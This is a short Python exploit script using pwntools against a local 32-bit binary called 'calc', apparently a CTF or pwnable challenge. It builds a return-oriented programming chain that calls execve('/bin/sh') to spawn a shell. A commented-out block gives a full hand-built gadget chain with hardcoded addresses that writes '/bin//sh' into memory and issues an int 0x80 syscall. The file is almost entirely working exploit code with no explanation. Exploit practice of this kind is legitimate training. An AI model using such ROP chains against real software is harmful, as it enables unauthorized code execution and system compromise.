from pwn import *

context.clear(arch='i386', kernel='i386')

elf = ELF("./calc/calc")

rop = ROP(elf)

print(hex(rop.eax.address))
# print(rop.call('execve', ['/bin/sh', 0, 0]))
rop.execve('/bin/sh', 0, 0)
print(rop.dump())




'''from struct import pack

# Padding goes here
p = b''

p += pack('<I', 0x080701aa) # pop edx ; ret
p += pack('<I', 0x080ec060) # @ .data
p += pack('<I', 0x0805c34b) # pop eax ; ret
p += b'/bin'
p += pack('<I', 0x0809b30d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080701aa) # pop edx ; ret
p += pack('<I', 0x080ec064) # @ .data + 4
p += pack('<I', 0x0805c34b) # pop eax ; ret
p += b'//sh'
p += pack('<I', 0x0809b30d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080701aa) # pop edx ; ret
p += pack('<I', 0x080ec068) # @ .data + 8
p += pack('<I', 0x080550d0) # xor eax, eax ; ret
p += pack('<I', 0x0809b30d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481d1) # pop ebx ; ret
p += pack('<I', 0x080ec060) # @ .data
p += pack('<I', 0x080701d1) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080ec068) # @ .data + 8
p += pack('<I', 0x080ec060) # padding without overwrite ebx
p += pack('<I', 0x080701aa) # pop edx ; ret
p += pack('<I', 0x080ec068) # @ .data + 8
p += pack('<I', 0x080550d0) # xor eax, eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x0807cb7f) # inc eax ; ret
p += pack('<I', 0x08049a21) # int 0x80'''